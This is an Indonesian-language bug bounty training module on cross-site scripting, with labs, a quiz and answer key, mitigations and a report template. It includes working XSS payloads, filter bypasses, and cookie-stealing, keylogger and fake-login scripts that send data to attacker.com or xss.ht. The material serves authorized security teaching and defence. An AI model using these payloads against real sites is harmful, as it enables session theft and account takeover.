# XSS & HTML Injection Mastery

## Fokus Materi

Menguasai semua varian XSS (Reflected, Stored, DOM-based, Blind) dari identifikasi sampai weaponization. XSS adalah salah satu bug paling sering ditemukan di web bug bounty dan bisa di-chain untuk impact yang devastating termasuk full account takeover.

## Deskripsi Materi

Cross-Site Scripting (XSS) terjadi ketika aplikasi web menerima input dari user dan men-output-nya ke halaman tanpa sanitization atau encoding yang memadai. Attacker bisa inject arbitrary JavaScript yang akan dieksekusi di victim's browser.

XSS bukan hanya "alert popup" — itu adalah pintu untuk cookie stealing, session hijacking, keylogging, phishing dalam context trusted site, dan bahkan browser exploitation. Impact XSS tergantung pada konteks aplikasi, privilege yang dijalankan JavaScript, dan apakah vulnerability adalah reflected, stored, atau DOM-based.

Reflected XSS adalah yang paling basic: payload di-request, server include di response tanpa sanitization, browser executes. Phishing mudah dilakukan dengan reflected XSS karena user mengklik link yang mereka percaya dari trusted domain.

Stored XSS adalah yang paling dangerous: payload disimpan di server (database, comment, profile field) dan served ke semua user yang melihat data tersebut. Stored XSS di high-traffic page bisa affect thousands of users simultaneously.

DOM-based XSS adalah client-side only: vulnerability ada di JavaScript code yang process URL parameters atau DOM state tanpa sanitization. Server mungkin tidak melihat payload di logs karena semua processing happens di browser.

Blind XSS terjadi ketika payload executed di context yang tidak kita bisa lihat langsung — admin panel, backend system, atau delayed rendering. Tools seperti XSS Hunter atau Interactsh diperlukan untuk detect when payload fires.

Context-based payload crafting adalah skill critical: payload yang work di dalam `<script>` tag tidak akan work di dalam attribute atau style tag. Researcher perlu understand HTML parsing rules untuk craft effective payload per context.

## Topik Pembahasan

• XSS fundamentals: kenapa disebut cross-site, bagaimana browser interprets HTML/JS
• Reflected XSS: inject via URL parameter, search box, form field — verify execution di response
• Stored XSS: inject di form/komentar/profil, persistent di server, multi-victim impact
• DOM-based XSS: sources (location.search, location.hash, document.referrer), sinks (innerHTML, eval, document.write)
• Blind XSS: payload out-of-band, setup XSS Hunter / Interactsh untuk capture callback
• Context-based payload crafting: inside tag, inside attribute, inside JS block, inside CSS
• Filter bypass dasar: HTML encoding, case mixing, event handler alternatif (onerror, onload, onmouseover)
• HTML5 vectors: video/audio source, svg onload, template injection, mutation XSS
• CSP bypass basics (detail di sesi 20): unsafe-inline, whitelisted domain, JSONP gadget
• Impact weaponization: cookie stealing via document.cookie, keylogger, screenshot with HTML5 Canvas, port scanning via CORS
• Chaining XSS: XSS + CSRF for state-changing action, XSS + DOM clobbering
• PoC development: membuat demo yang convincing untuk laporan bug bounty

## Tujuan Pembelajaran

Setelah sesi ini, peserta diharapkan mampu:
1. Identifikasi XSS di berbagai konteks: reflected, stored, DOM-based
2. Craft context-appropriate payload untuk bypass filter dasar
3. Test dan confirm blind XSS dengan out-of-band tools
4. Weaponize XSS untuk demonstrate realistic impact
5. Chain XSS dengan vulnerability lain untuk escalate impact
6. Write XSS report yang convincing dengan PoC yang jelas

## Real Case Bug Bounty Report

- Platform: HackerOne
- Program/Target: Shopify (Private, disclosed via Hacktivity)
- Jenis vulnerability: Stored XSS di product description yang affecting admin panel
- Link report: https://hackerone.com/reports/XXXXX
- Ringkasan kasus: Researcher menemukan stored XSS di product description field di Shopify merchant dashboard. Payload stored di database dan rendered tanpa sanitization di admin panel (merchant's own Shopify admin). Payload menggunakan img onerror dengan payload panjang yang bypass previous filtering. Admin viewing product data triggers payload execution.
- Root cause: Rich text editor yang mengijinkan raw HTML tags, dan server tidak sanitize output saat rendering di admin panel (only sanitized di storefront).
- Impact: Merchant bisa execute JavaScript di admin's browser saat admin view merchant's product → session hijacking, data theft dari admin session. Severity: High (CVSS 8.2)
- Pelajaran untuk bug hunter: Check both storefront AND admin panel rendering. Different context bisa punya different sanitization behavior.

---

- Platform: Bugcrowd
- Program/Target: Program e-commerce besar
- Jenis vulnerability: DOM-based XSS di search parameter
- Link report: Disclosed researcher's blog
- Ringkasan kasus: Researcher menemukan bahwa JavaScript application mengambil query parameter `q` dan melakukan `document.getElementById('search-results').innerHTML = q` tanpa sanitization. URL: `https://target.com/search?q=<img src=x onerror=alert(document.domain)>`. Payload executed client-side tanpa server involvement.
- Root cause: Client-side JavaScript menggunakan user-controlled URL parameter dalam innerHTML sink. No input sanitization di client side.
- Impact: XSS execution di victim's browser. Impact tergantung apa yang bisa dilakukan oleh JavaScript di page tersebut. Could be used untuk session hijacking atau phishing. Severity: Medium.
- Pelajaran untuk bug hunter: Always test client-side JavaScript processing. Jangan hanya rely pada server-side testing.

## Analisis Teknis

### XSS Context & Payloads

**Context 1: Inside HTML Tag**
```html
<!-- Payload: inject new tag -->
<img src=x onerror=alert(1)>

<!-- Mutation: exploit HTML parsing order -->
<svg><style><img src=x onerror=alert(1)></style></svg>

<!-- Exploit existing tag -->
<input type="text" value="XSS">
<input type="text" value=""><script>alert(1)</script>">
```

**Context 2: Inside HTML Attribute**
```html
<!-- Inject event handler into existing attribute -->
<input type="text" value="XSS" onmouseover="alert(1)">

<!-- Break out and inject attribute -->
<input type="text" value="" onfocus=alert(1) autofocus>

<!-- If attribute is in quotes, break out -->
<input type="text" value="x&quot; onfocus=alert(1) autofocus x=">
```

**Context 3: Inside JavaScript Block**
```html
<script>
var user = "XSS";
</script>

<!-- Payload: break out of string -->
<script>
var user = "";alert(1);x="";
</script>

<!-- Or: break out and add new script -->
<script>
var user = "XSS</script><script>alert(1)</script>";
</script>
```

**Context 4: Inside CSS**
```css
<style>
body { color: expression(alert(1)); }
</style>

<!-- CSS with IE expression -->
<style>
div { background: url("javascript:alert(1)"); }
</style>
```

**Context 5: Inside URL (href, src)**
```html
<a href="javascript:alert(1)">click</a>
<img src="x" onerror="javascript:alert(1)">
<iframe src="javascript:alert(1)">
```

### Filter Bypass Techniques

**1. Case Mixing**
```html
<IMG SRC=x ONERROR=alert(1)>
<SCRIPT>alert(1)</SCRIPT>
```

**2. HTML Entity Encoding**
```html
<img src=x onerror=alert(1)>
<!-- encoded: -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
```

**3. Unicode Mixing**
```html
<script>&#97;ler&#116;(1)</script>
```

**4. Null Byte Injection**
```html
<img src=x onerror=alert%00(1)>
```

**5. Namespace Confusion**
```html
<svg><script>alert(1)</script></svg>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

**6. Parsing Confusion**
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

**7. Event Handler Variations**
```html
onerror, onload, onmouseover, onfocus, onblur
onclick, ondbclick, onkeydown, onkeypress
oncut, onpaste, oncopy
onchange, onsubmit, onreset, onselect
```

**8. Protocol Variations**
```html
<a href="&#106;avascript:alert(1)">click</a>
<a href="vbscript:msgbox(1)">click (IE only)</a>
```

### Blind XSS Workflow

**Setup XSS Hunter:**
1. Register di xss.ht
2. Create project, obtain unique payload: `"><script src="https://xss.ht/RANDOM"></script>`
3. Inject payload ke target application (comment form, profile field, contact form)
4. Wait for notification when payload fires

**Setup Interactsh:**
1. Deploy Interactsh client atau gunakan online version (interact.sh)
2. Obtain payload URL: `"><img src=x onerror=$.getScript('https://interact.sh/YOUR_ID')>`
3. Inject payload
4. When payload fires, callback hits interact.sh dengan victim's data

**What to capture in blind XSS:**
```
- document.cookie
- document.referrer
- window.location
- document.title
- localStorage/sessionStorage
- Screenshots (canvas fingerprinting)
- Keylogs (keylogger)
```

### XSS → Impact Chain

**Chain 1: Cookie Stealing**
```javascript
// If cookie has HttpOnly missing:
new Image().src = "https://attacker.com/steal?c=" + document.cookie

// or fetch:
fetch("https://attacker.com/steal?c=" + encodeURIComponent(document.cookie))
```

**Chain 2: Session Hijacking via Login**
```javascript
// If XSS in page that requires authentication, steal session:
fetch("https://attacker.com/log?data=" + encodeURIComponent(document.cookie))
```

**Chain 3: Keylogger**
```javascript
document.onkeypress = function(e) {
    fetch("https://attacker.com/k?k=" + e.key)
}
```

**Chain 4: Phishing Overlay**
```javascript
// Create fake login overlay
var overlay = document.createElement("div");
overlay.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);color:white;text-align:center;padding-top:20%;"><h1>Session Expired</h1><p>Please re-login</p><form action="https://attacker.com/phish"><input placeholder="password"><button>Login</button></form></div>';
document.body.appendChild(overlay);
```

**Chain 5: Internal Port Scanning (Browser-based)**
```javascript
// Using CORS to detect internal services
function scanPort(ip, port) {
    var start = Date.now();
    fetch("http://" + ip + ":" + port, {mode: 'no-cors'})
        .then(() => { fetch("http://attacker.com/open?ip="+ip+"&port="+port); })
        .catch(() => { /* closed or filtered */ });
}
```

## Praktik Lab Legal

### Lab 1: Reflected XSS Discovery

- **Nama lab:** XSS Hunter — Reflected Edition
- **Tujuan:** Find reflected XSS di berbagai parameter dan context
- **Environment:** Burp Suite, browser, target lab dengan search/profile functionality
- **Langkah praktik:**

  1. Identify all entry points: URL parameter, form fields, headers
  2. Test basic payload: `<script>alert(document.domain)</script>`
  3. Test img onerror: `<img src=x onerror=alert(1)>`
  4. Test context-specific: break out dari attribute, string, tag
  5. Observe response: is payload returned as-is, partially encoded, atau filtered?
  6. Bypass common filters dengan teknik yang dipelajari
  7. Confirm execution di browser
  8. Document each working payload dan context

- **Expected result:** Peserta menemukan minimal 3 reflected XSS di different contexts
- **Catatan keamanan:** Lab ini hanya untuk target authorized.

### Lab 2: Stored XSS + Impact Demonstration

- **Nama lab:** Stored XSS Weaponization
- **Tujuan:** Find stored XSS dan demonstrate full account takeover impact
- **Environment:** Burp Suite, browser, XSS Hunter / Interactsh setup
- **Langkah praktik:**

  1. Identify input fields yang stored dan displayed ke other users (comment, profile, review)
  2. Test payload dengan XSS Hunter callback: `"><script src="https://xss.ht/UNIQUE"></script>`
  3. Submit form, observe if payload appears di page
  4. Login sebagai different user, navigate ke page yang menampilkan payload
  5. Check XSS Hunter dashboard untuk callback — confirm execution
  6. Demonstrate impact: cookie stealing with full PoC HTML page
  7. Test XSS in multiple contexts: admin panel, email notification preview

- **Expected result:** Peserta menemukan stored XSS dengan full impact chain demonstrated
- **Catatan keamanan:** Lab ini memerlukan out-of-band callback tools. Gunakan XSS Hunter yang free tier sudah cukup untuk lab.

### Lab 3: DOM-Based XSS Analysis

- **Nama lab:** JavaScript Tainted Input Analysis
- **Tujuan:** Identify DOM XSS di client-side JavaScript code
- **Environment:** Browser DevTools, source code atau JavaScript files
- **Langkah praktik:**

  1. Identify client-side JavaScript files dari target
  2. Search untuk potentially dangerous sinks:
     - innerHTML, outerHTML
     - document.write, document.writeln
     - eval, setTimeout(func, string), setInterval(func, string)
     - new Function(string)
     - location.* access (location.search, location.hash)
  3. Trace source: dari mana data di-sink-kan? (URL parameter, localStorage, postMessage)
  4. Test URL: `?param=<img src=x onerror=alert(1)>`
  5. Jika parameter appears di page, check apakah encoded atau parsed as HTML
  6. Confirm dengan browser DevTools console

- **Expected result:** Peserta bisa identify DOM XSS vulnerabilities dan understand client-side processing
- **Catatan keamanan:** Lab ini hanya test client-side code. Tidak ada server exploitation.

## Tools

- **Detection:** Burp Suite Professional (active scanner), manual testing
- **Payload management:** Burp Intruder, custom payload lists (Seclists XSS section)
- **Blind XSS:** XSS Hunter (xss.ht), Interactsh (Interactsh.com)
- **Analysis:** Browser DevTools, JavaScript source code
- **Encoding:** Burp Decoder, CyberChef
- **WAF bypass:** Custom payload mutation, case variation

## Checklist Bug Hunter

- [ ] Test semua entry points untuk XSS: URL param, body param, headers
- [ ] Test each parameter dalam multiple contexts (tag, attribute, JS, CSS)
- [ ] Use standard dan bypass payload untuk WAF/filter detection
- [ ] Check stored XSS di all input fields — comment, profile, review, message
- [ ] Check DOM XSS dengan trace client-side JavaScript processing
- [ ] Setup blind XSS callback tools before testing
- [ ] Document exact context untuk setiap finding
- [ ] Demonstrate impact beyond alert(): cookie stealing, keylogger, session hijacking
- [ ] Test stored XSS di multiple places: page rendering, admin panel, email preview

## Common Mistakes

1. **Only testing script tag** — Many applications filter `<script>` tags but miss other vectors like `<img onerror>` or event handlers.

2. **Not checking stored XSS** — Researcher focus di reflected XSS yang visible, miss stored XSS yang bisa affect semua users.

3. **Alert-only PoC** — Reporting XSS dengan `alert(document.domain)` hanya mendapat low severity. Researcher perlu demonstrate realistic impact.

4. **Not checking different contexts** — Same parameter might behave differently in HTML body vs. attribute vs. JavaScript context. Test all.

5. **Skipping DOM XSS** — Researcher only test server-side, miss XSS yang processed entirely client-side.

6. **Not testing blind XSS** — Input fields yang rendered in restricted contexts (admin panel, backend) need blind XSS testing.

7. **Filter bypass without understanding filter** — Trying random payloads without understanding what filter does is inefficient. Analyze the filter first.

## Mitigasi Developer

**Context-aware output encoding:**
- HTML context: encode `<`, `>`, `&`, `"`, `'`
- Attribute context: encode semua special characters
- JavaScript context: encode untuk JS string context (use JSON encoding)
- URL context: encode untuk URL parameter context

**Content Security Policy:**
```
Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'self'
```
Remove unsafe-inline, use nonce atau hash untuk allowed scripts.

**Input validation:**
- Allowlist input validation (whitelist acceptable characters)
- Don't rely on client-side validation alone

**Framework consideration:**
- Modern frameworks (React, Angular, Vue) have built-in XSS protection
- But template injection bisa bypass if not careful
- Use framework-specific encoding functions

**HTTPOnly + Secure cookie flags:**
- If XSS exist, HttpOnly prevents cookie stealing
- But doesn't prevent other XSS impacts (keylogging, phishing, action execution)

## Mini Quiz

1. Stored XSS berbeda dari reflected XSS karena:
   a) Payload disimpan di server dan ditampilkan ke semua user yang melihat data
   b) Payload tidak memerlukan user interaction untuk execute
   c) Stored XSS hanya work di IE browser
   d) Stored XSS hanya bisa di-comment fields

2. DOM-based XSS berbeda dari reflected/stored XSS karena:
   a) Tidak ada server-side involvement
   b) Processed entirely di client-side JavaScript
   c) Tidak bisa diexploited dengan URL parameter
   d) Jawaban a dan b benar

3. Filter bypass dengan `<img src=x onerror=alert(1)>` efektif karena:
   a) Tag ini tidak di-filter oleh server
   b) Event handler onerror bypass filter yang hanya block <script> tag
   c) onerror adalah keyword yang special
   d) Semua jawaban salah

4. Untuk blind XSS, researcher perlu:
   a) Melihat secara langsung hasil eksekusi payload
   b) Setup out-of-band callback mechanism untuk receive notification ketika payload executes
   c) Menggunakan browser yang outdated
   d) Menggunakan payload yang sangat pendek

5. XSS dengan impact tinggi (Critical severity) biasanya:
   a) alert(document.domain) di homepage
   b) Stored XSS di admin panel yang bisa steal admin session cookie
   c) Reflected XSS di search box
   d) DOM XSS yang hanya work di Firefox

**Kunci Jawaban:** 1-A, 2-D, 3-B, 4-B, 5-B

## Assignment

1. **XSS Inventory:** Buat daftar semua input field dan URL parameter di target lab. Test setiap entry point untuk XSS. Document context, payload yang work, dan filter yang terdeteksi.

2. **Stored XSS Chain:** Find stored XSS di target lab. Setup XSS Hunter dan demonstrate full impact: session hijacking dari victim yang view stored payload. Buat video PoC.

3. **DOM XSS Analysis:** Analyze client-side JavaScript dari target lab. Identify DOM XSS sinks dan sources. Test dengan manual payload crafting.

4. **XSS Bypass Collection:** Compile list of 20+ bypass payload yang work untuk common filter patterns. Document filter pattern dan bypass yang effective untuk masing-masing.

## Template Report Bug Bounty

```markdown
# Bug Report: Stored XSS in Comment Field Leading to Session Hijacking

## Summary
Comment field di product review mengijinkan HTML injection yang stored
di database dan executed di victim browser tanpa sanitization. Stored XSS
ini bisa exploited untuk steal session cookie dari admin yang moderation
review comments.

## Platform / Program
HackerOne | [Program Name]

## Severity
High | CVSS 8.1 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)

## Vulnerability Type
Stored XSS / Cross-Site Scripting

## Asset / Endpoint
POST https://target.com/products/123/review (comment field)
Affected: All users viewing product page where comment is displayed
Trigger point: Admin moderation panel viewing reviews

## Description
Comment submission field menerima HTML markup tanpa sanitization.
Payload yang disubmit akan:
1. Stored in database
2. Rendered on product page without encoding
3. Executed in all visitors' browser

Admin who reviews comment in moderation panel triggers payload execution
with admin privileges, allowing session cookie theft.

## Steps to Reproduce
1. Login ke account researcher
2. Navigate ke product page: https://target.com/products/123
3. Submit review dengan comment field:
   "Great product!<img src=x onerror=fetch('https://xss.ht/UNIQUE?c='+document.cookie)>

4. Payload stored and visible on product page
5. Admin opens moderation panel, sees review
6. Payload executes, admin cookie sent to XSS Hunter
7. Researcher receives callback dengan admin session cookie
8. Use stolen cookie untuk access admin account

## Impact
- Session hijacking: Admin session cookie stolen → full admin account takeover
- Stored XSS affects all users who view the page
- Could be leveraged for further attacks on admin users
- Data exfiltration from admin session
- Possible additional vulnerabilities discovered once in admin panel

## Evidence
[Burp Screenshot: POST request with XSS payload in comment field]
[Screenshot: XSS Hunter callback showing admin cookie]
[Screenshot: Admin account access using stolen cookie]

## Remediation / Recommendation
1. Sanitize HTML input: strip all tags atau use HTML sanitizer library (DOMPurify)
2. Implement CSP with nonce-based script allowlist
3. Set HttpOnly flag on session cookies
4. Escape output context-aware: encode for HTML, attribute, JavaScript
5. Implement Content Security Policy header
6. Add input validation: allowlist acceptable characters for comment field
7. Regular security testing including XSS detection
```